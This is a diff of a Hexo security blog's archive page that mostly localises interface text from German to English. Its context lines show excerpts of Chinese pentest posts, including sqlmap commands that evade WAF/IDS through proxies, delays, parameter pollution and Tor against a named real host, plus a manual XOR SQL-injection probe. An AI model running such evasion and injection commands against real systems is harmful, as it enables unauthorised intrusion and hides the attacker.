@@ -6,7 +6,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <meta name="generator" content="攻VS防，战略与战术！马拉松式工作！">
-    <title>Archiv - 攻VS防，战略与战术！马拉松式工作！</title>
+    <title>Archives - 攻VS防，战略与战术！马拉松式工作！</title>
     <meta name="author" content="Lao k17">
     
         <meta name="keywords" content="hexo,javascript,安全,">
@@ -241,57 +241,6 @@
     <section class="postShorten-group main-content-wrap">
     
     
-    <article class="postShorten postShorten--thumbnailimg-bottom">
-        <div class="postShorten-wrap">
-            
-            <div class="postShorten-header">
-                <h1 class="postShorten-title">
-                    
-                        <a class="link-unstyled" href="/2018/07/14/hello-world/">
-                            Hello World
-                        </a>
-                    
-                </h1>
-                <div class="postShorten-meta">
-    <time datetime="2018-07-14T23:39:14+08:00">
-	
-		    14 7月 2018
-    	
-    </time>
-    
-</div>
-
-            </div>
-            
-                <div class="postShorten-content">
-                    <p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>
-
-                    
-                        
-
-                    
-                    
-                        <p>
-                            <a href="/2018/07/14/hello-world/#post-footer" class="postShorten-excerpt_link link">
-                                Kommentieren und teilen
-                            </a>
-                        </p>
-                    
-                </div>
-            
-        </div>
-        
-    </article>
-    
-    
     <article class="postShorten postShorten--thumbnailimg-right">
         <div class="postShorten-wrap">
             
@@ -306,7 +255,7 @@
                 <div class="postShorten-meta">
     <time datetime="2017-03-02T15:13:48+08:00">
 	
-		    02 3月 2017
+		    3月 02, 2017
     	
     </time>
     
@@ -324,7 +273,7 @@
                     <p><strong>PS</strong>: 内容摘自煜铭2011的博客<a href="http://blog.csdn.net/qq_29277155，仅供传阅学习！" target="_blank" rel="noopener">http://blog.csdn.net/qq_29277155，仅供传阅学习！</a><br>0x00 前言<br>   现在的网络环境往往是WAF/IPS/IDS保护着Web 服务器等等，这种保护措施往往会过滤挡住我们的SQL注入查询链接，甚至封锁我们的主机IP，所以这个时候，我们就要考虑怎样进行绕过，达到注入的目标。因为现在WAF/IPS/IDS都把sqlmap 列入黑名单了，呵呵！但是本文基于sqlmap 进行绕过注入测试，介绍至今仍然实用有效的技巧，以下策略在特定的环境能够成功绕过，具体是否绕过，请仔细查看输出的信息。<br>0x01 确认WAF<br>     首先我们判断该Web 服务器是否被WAF/IPS/IDS保护着。这点很容易实现，因为我们在漏扫或者使用专门工具来检测是否有WAF，这个检测，在nmap 的NSE，或者WVS的策略或者APPSCAN的策略中都有，我们可以利用这些来判断。在此我们，也介绍使用sqlmap 进行检测是否有WAF/IPS/IDS<br>root@kali:~# sqlmap -u “<a href="http://yiliao.kingdee.com/contents.PHP?id=51&amp;types=4&quot;" target="_blank" rel="noopener">http://yiliao.kingdee.com/contents.PHP?id=51&amp;types=4&quot;</a> –thread 10 –identify-waf#首选<br>root@kali:~# sqlmap -u “<a href="http://yiliao.kingdee.com/contents.php?id=51&amp;types=4&quot;" target="_blank" rel="noopener">http://yiliao.kingdee.com/contents.php?id=51&amp;types=4&quot;</a> –thread 10  –check-waf#备选<br>0x02 使用参数进行绕过<br>root@kali:~# sqlmap -u “<a href="http://yiliao.kingdee.com/contents.php?id=51&amp;types=4&quot;" target="_blank" rel="noopener">http://yiliao.kingdee.com/contents.php?id=51&amp;types=4&quot;</a> –random-agent -v 2 #使用任意浏览器进行绕过，尤其是在WAF配置不当的时候<br>root@kali:~# sqlmap -u “<a href="http://yiliao.kingdee.com/contents.php?id=51&amp;types=4&quot;" target="_blank" rel="noopener">http://yiliao.kingdee.com/contents.php?id=51&amp;types=4&quot;</a> –hpp -v 3#使用HTTP 参数污染进行绕过，尤其是在ASP.NET/IIS 平台上<br>root@kali:~# sqlmap -u “<a href="http://yiliao.kingdee.com/contents.php?id=51&amp;types=4&quot;" target="_blank" rel="noopener">http://yiliao.kingdee.com/contents.php?id=51&amp;types=4&quot;</a> –delay=3.5 –time-sec=60 #使用长的延时来避免触发WAF的机制，这方式比较耗时<br>root@kali:~# sqlmap -u “<a href="http://yiliao.kingdee.com/contents.php?id=51&amp;types=4&quot;" target="_blank" rel="noopener">http://yiliao.kingdee.com/contents.php?id=51&amp;types=4&quot;</a> –proxy=211.211.211.211:8080 –proxy-cred=211:985#使用代理进行注入<br>root@kali:~# sqlmap -u “<a href="http://yiliao.kingdee.com/contents.php?id=51&amp;types=4&quot;" target="_blank" rel="noopener">http://yiliao.kingdee.com/contents.php?id=51&amp;types=4&quot;</a> –ignore-proxy#禁止使用系统的代理，直接连接进行注入<br>root@kali:~# sqlmap -u “<a href="http://yiliao.kingdee.com/contents.php?id=51&amp;types=4&quot;" target="_blank" rel="noopener">http://yiliao.kingdee.com/contents.php?id=51&amp;types=4&quot;</a> –flush-session#清空会话，重构注入<br>root@kali:~# sqlmap -u “<a href="http://yiliao.kingdee.com/contents.php?id=51&amp;types=4&quot;" target="_blank" rel="noopener">http://yiliao.kingdee.com/contents.php?id=51&amp;types=4&quot;</a> –hex#或者使用参数 –no-cast ，进行字符码转换<br>root@kali:~# sqlmap -u “<a href="http://yiliao.kingdee.com/contents.php?id=51&amp;types=4&quot;" target="_blank" rel="noopener">http://yiliao.kingdee.com/contents.php?id=51&amp;types=4&quot;</a>  –mobile #对移动端的服务器进行注入<br>root@kali:~# sqlmap -u “<a href="http://yiliao.kingdee.com/contents.php?id=51&amp;types=4&quot;" target="_blank" rel="noopener">http://yiliao.kingdee.com/contents.php?id=51&amp;types=4&quot;</a> –tor # 匿名注入<br>0x03 使用脚本介绍<br>
                     
                         <a href="/2017/03/02/使用sqlmap-绕过防火墙进行注入测试/" class="postShorten-excerpt_link link">
-                            Weiterlesen
+                            Continue reading
                         </a>
                         
                     
@@ -349,7 +298,7 @@
                 <div class="postShorten-meta">
     <time datetime="2017-03-01T17:02:40+08:00">
 	
-		    01 3月 2017
+		    3月 01, 2017
     	
     </time>
     
@@ -382,7 +331,7 @@
 </code></pre>
                     
                         <a href="/2017/03/01/coolfire黑客入门教程/" class="postShorten-excerpt_link link">
-                            Weiterlesen
+                            Continue reading
                         </a>
                         
                     
@@ -407,7 +356,7 @@
                 <div class="postShorten-meta">
     <time datetime="2017-03-01T16:49:11+08:00">
 	
-		    01 3月 2017
+		    3月 01, 2017
     	
     </time>
     
@@ -425,7 +374,7 @@
                     <p><strong>渗透笔记</strong><br>【 常见网站程序 】<br>—————————————————————————————–<br>asp类：<br>foosun(风讯)<br>kesion(科汛)newasp(新云)<br>乔客CreateLive(创力)<br>5uCMSKingCMS<br>DvBBS(动网)<br>BBSxp[博客]zblog<br>[博客]pjblog<br>—————————————————————————————–<br>PHP类：<br>DeDeCms（织梦）<br>ECMS（帝国）<br>PHPCMS<br>PHP168<br>HBcms（宏博）SupeSite<br>CMSware(思维)Joomla!<br>[BBS]Discuz!<br>[BBS]phpWind[SNS]UCenterHome<br>[SNS]ThinkSNS[商城]EcShop<br>[商城]ShopEx[博客]WordPress<br>[维基]HDWiki<br>[微博]PHPsay[DIGG]PBdigg<br>—————————————————————————————–<br>
                     
                         <a href="/2017/03/01/渗透笔记/" class="postShorten-excerpt_link link">
-                            Weiterlesen
+                            Continue reading
                         </a>
                         
                     
@@ -450,7 +399,7 @@
                 <div class="postShorten-meta">
     <time datetime="2017-03-01T16:45:21+08:00">
 	
-		    01 3月 2017
+		    3月 01, 2017
     	
     </time>
     
@@ -472,7 +421,7 @@
 <p>2&gt; 使用xor 1=1; xor 1=2<br>结果:分别返回不同的页面,说明存在注入漏洞.<br>分析:xor 代表着异或,意思即连接的表达式仅有一个为真的时候才为真。 记住：xor注入时，xor后面的语句如果是正确的，则返回错误页面积，如果是错误，则返回正确 页面，说明存在注入点。<br>
                     
                         <a href="/2017/03/01/手工注入/" class="postShorten-excerpt_link link">
-                            Weiterlesen
+                            Continue reading
                         </a>
                         
                     
@@ -497,7 +446,7 @@
                 <div class="postShorten-meta">
     <time datetime="2017-03-01T16:11:54+08:00">
 	
-		    01 3月 2017
+		    3月 01, 2017
     	
     </time>
     
@@ -520,7 +469,7 @@
 <p>6.常见的网站服务器容器。<br>答：IIS、Apache、nginx、Lighttpd、Tomcat<br>
                     
                         <a href="/2017/03/01/渗透测试信息探测问答/" class="postShorten-excerpt_link link">
-                            Weiterlesen
+                            Continue reading
                         </a>
                         
                     
@@ -545,7 +494,7 @@
                 <div class="postShorten-meta">
     <time datetime="2017-03-01T16:03:15+08:00">
 	
-		    01 3月 2017
+		    3月 01, 2017
     	
     </time>
     
@@ -569,7 +518,7 @@
 <p>Mysql报错界面<br>每一种数据库，报错的话有可能会显示数据库信息。<br>
                     
                         <a href="/2017/03/01/渗透测试——信息收集随谈/" class="postShorten-excerpt_link link">
-                            Weiterlesen
+                            Continue reading
                         </a>
                         
                     
@@ -594,7 +543,7 @@
                 <div class="postShorten-meta">
     <time datetime="2017-02-09T16:20:08+08:00">
 	
-		    09 2月 2017
+		    2月 09, 2017
     	
     </time>
     
@@ -629,7 +578,7 @@ web漏洞识别，不行旁注或者弱口令，接着就到后渗透阶段，�
 </code></pre>
                     
                         <a href="/2017/02/09/学习渗透测试的感悟/" class="postShorten-excerpt_link link">
-                            Weiterlesen
+                            Continue reading
                         </a>
                         
                     
@@ -654,7 +603,7 @@ web漏洞识别，不行旁注或者弱口令，接着就到后渗透阶段，�
                 <div class="postShorten-meta">
     <time datetime="2017-02-09T11:09:11+08:00">
 	
-		    09 2月 2017
+		    2月 09, 2017
     	
     </time>
     
@@ -691,7 +640,7 @@ Office编辑与格式注意（标题、封面、页眉、页码、字体等）�
 </code></pre>
                     
                         <a href="/2017/02/09/安全人员基本技能/" class="postShorten-excerpt_link link">
-                            Weiterlesen
+                            Continue reading
                         </a>
                         
                     
@@ -716,7 +665,7 @@ Office编辑与格式注意（标题、封面、页眉、页码、字体等）�
                 <div class="postShorten-meta">
     <time datetime="2017-01-20T22:01:50+08:00">
 	
-		    20 1月 2017
+		    1月 20, 2017
     	
     </time>
     
@@ -746,7 +695,49 @@ Office编辑与格式注意（标题、封面、页眉、页码、字体等）�
                     
                         <p>
                             <a href="/2017/01/20/业务安全/#post-footer" class="postShorten-excerpt_link link">
-                                Kommentieren und teilen
+                                Comment and share
+                            </a>
+                        </p>
+                    
+                </div>
+            
+        </div>
+        
+    </article>
+    
+    
+    <article class="postShorten postShorten--thumbnailimg-bottom">
+        <div class="postShorten-wrap">
+            
+            <div class="postShorten-header">
+                <h1 class="postShorten-title">
+                    
+                        <a class="link-unstyled" href="/2017/01/20/jishubu/">
+                            jishubu
+                        </a>
+                    
+                </h1>
+                <div class="postShorten-meta">
+    <time datetime="2017-01-20T18:54:24+08:00">
+	
+		    1月 20, 2017
+    	
+    </time>
+    
+</div>
+
+            </div>
+            
+                <div class="postShorten-content">
+                    
+                    
+                        
+
+                    
+                    
+                        <p>
+                            <a href="/2017/01/20/jishubu/#post-footer" class="postShorten-excerpt_link link">
+                                Comment and share
                             </a>
                         </p>
                     
@@ -762,12 +753,12 @@ Office编辑与格式注意（标题、封面、页眉、页码、字体等）�
         
           <li class="pagination-next">
             <a class="btn btn--default btn--small" href="/archives/page/2/">
-              <span>ÄLTERE BEITRÄGE</span>
+              <span>OLDER POSTS</span>
               <i class="fa fa-angle-right text-base icon-ml"></i>
             </a>
           </li>
         
-        <li class="pagination-number">Seite 1 von 2</li>
+        <li class="pagination-number">page 1 of 2</li>
     </ul>
 </div>
 
